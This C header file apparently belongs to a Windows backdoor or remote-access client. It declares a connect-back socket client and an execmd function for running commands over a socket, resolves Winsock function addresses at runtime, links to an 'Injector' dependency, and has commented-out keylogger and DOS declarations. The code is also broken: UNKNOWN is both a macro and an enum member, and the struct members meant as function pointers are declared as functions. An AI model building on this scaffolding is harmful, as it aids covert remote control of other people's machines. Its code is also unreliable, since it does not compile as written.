#ifndef CXENONh_H
#define CXENONh_H


#include "../Include/driver/socket.h"
#include "../../../Injector/Dependencies/parse/parse.h"

#define Exit -2
#define UNKNOWN 2

#if defined(_WIN32)


int WININIT(void);
//      char* keylogger(void);
//      void DOS(void);


struct functionaddr
{
    
    SOCKET* (function_socket)(int af, int type, int protocol);
    int* (function_connect)(SOCKET s, const sockaddr* name, int namelen);
    int* (function_WSAcleanup)(void);
    int* (function_WSAstartup)(WORD wordedversion, LPWSADATA lpWSAData);
    
};


enum _USTATUS
{

	ONLINE=0x00,
	OFFLINE=0x01,
	UNKNOWN=0x02

};


#endif

typedef struct
{

	int dstport;
	char* dstaddr;

} ClientCTX, *pClientCTX;

struct functionaddr GetFunctionVA(struct functionaddr* funcVA);
pClientCTX CliInit(const char* inetaddr, const int port);
SOCKET client_socket(SOCKET Socket);
SOCKET client_conn(SOCKET Socket, pClientCTX CTX);
int execmd(SOCKET Socket);

#endif